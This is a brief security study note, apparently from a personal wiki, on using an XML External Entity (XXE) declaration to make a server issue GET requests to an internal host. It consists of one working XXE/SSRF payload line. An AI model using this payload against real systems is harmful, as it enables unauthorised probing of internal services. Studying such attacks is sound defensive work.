---
tags:
  - web
  - security
---
A usage of [[XML External Entity|XXE]] to trigger server side GET requests.
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```